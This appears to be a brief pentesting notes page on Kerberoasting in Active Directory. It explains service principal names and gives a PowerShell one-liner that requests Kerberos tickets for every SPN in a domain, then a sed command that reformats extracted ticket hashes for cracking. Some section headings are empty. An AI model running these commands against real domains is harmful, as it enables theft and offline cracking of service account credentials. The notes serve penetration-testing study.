# Kerberoast

The kerberoast vulnerability assumes that the attacker has some foothold on the domain and has a low privileged domain account.

## Service Principal Names

> A service principal name \(SPN\) is a unique identifier of a service instance. SPNs are used by [Kerberos authentication](https://msdn.microsoft.com/en-us/library/ms677600%28v=vs.85%29.aspx) to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.

### Listing SPN's

### Fetching Tickets

#### Full SPN Scan

```text
PS C:\> Add-Type -AssemblyName System.IdentityModel  
PS C:\> setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } 
```

#### Get-SPN

[https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN](https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN)

### Exporting Tickets

## Cracking SPN Hashes

```bash
cat kirbi2johnoutput.txt | sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/'
```

## References

[Tim Medin - Kicking The Guard Dog of Hades](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin%281%29.pdf) \([Video](https://www.youtube.com/watch?v=PUyhlN-E5MU&feature=youtu.be)\)





